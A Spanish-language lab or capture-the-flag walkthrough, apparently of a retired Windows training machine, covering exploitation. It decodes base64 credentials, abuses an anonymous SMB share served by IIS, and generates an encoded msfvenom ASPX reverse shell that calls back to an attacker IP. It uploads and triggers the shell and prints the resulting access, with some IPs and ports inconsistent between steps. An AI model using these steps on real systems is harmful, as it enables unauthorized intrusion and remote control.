# Explotación

En esta fase analizaremos la información obtenida durante la enumeración con el objetivo de identificar un vector de explotación que permita obtener acceso al sistema objetivo.

## Descifrado de contraseñas encontradas

 Del documento `passwords.txt` se puede observar que dentro hay 2 textos cifrados en base64

 ```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
## Credenciales descrifradas

```
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123

```
```
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```
Luego de durar un tiempo tratando de ingresar al sistema vemos que las credenciales obtenidas no nos garantizan un acceso inicial a la máquina victima, por lo que tendremos que seguir buscando nuestro vector de ataque.

Recordemos que durante el análisis identificamos un `servidor HTTP` ejecutándose en un puerto no estándar. Este servicio resulta especialmente interesante, ya que debemos determinar qué aplicación está ejecutándose y, sobre todo, desde qué directorio está sirviendo el contenido.

## Confirmación

`smbclient //10.129.125.26/nt4wrksv -N`

subimos un archivo cualquiera 

`smb: \> put test.txt` 

Comprobamos si el archivo es accesible mediante HTTP:

`curl http://10.129.125.26:43669/test.txt`

Confirmamos que el servidor está expuesto, por lo que podemos generar un payload en .aspx. 

## ¿Por qué generar un payload en `.aspx`?

Utilizamos la extensión `.aspx` porque el servidor web está ejecutando IIS con soporte para ASP.NET. A diferencia de un archivo .exe, IIS puede procesar directamente un archivo .aspx, permitiendo ejecutar código en el contexto del servidor.

## Generación del payload con `MSFVENOM` en .aspx 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
```

Glosario del payload:

| **Parámetro** | **Descripción** |
|---|---|
| `-p windows/x64/shell_reverse_tcp` | Reverse shell de 64 bits. |
| `LHOST=192.168.196.220` | IP de mi máquina atacante. |
| `LPORT=4444` | Puerto de escucha. |
| `-e x64/shikata_ga_nai` | Encoder utilizado para modificar el payload. |
| `-f aspx` | Formato de salida ASPX. |
| `-o shell.aspx` | Nombre del archivo de salida. |

## Subida del payload 

```
smbclient //10.129.125.26/nt4wrksv -N -c 'put shell.aspx'
```

## Listener en kali

```
sudo nc -nlvp 4444

```

## Ejecución de payload 

```
curl http://10.129.125.26:49663/nt4wrksv/shell.aspx
```

## Acceso Inicial

```
connect to 10.129.125.26 from (UNKNOWN) [10.128.137.118] 49859
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Usuario obtenido:

```
IIS APPPOOL\DefaultAppPool
```
Una vez obtenido el acceso, nuestro siguiente objetivo será escalar privilegios dentro del sistema. Para ello, realizaremos una nueva fase de enumeración local en busca de permisos, configuraciones y posibles vectores que nos permitan elevar nuestro nivel de privilegios.
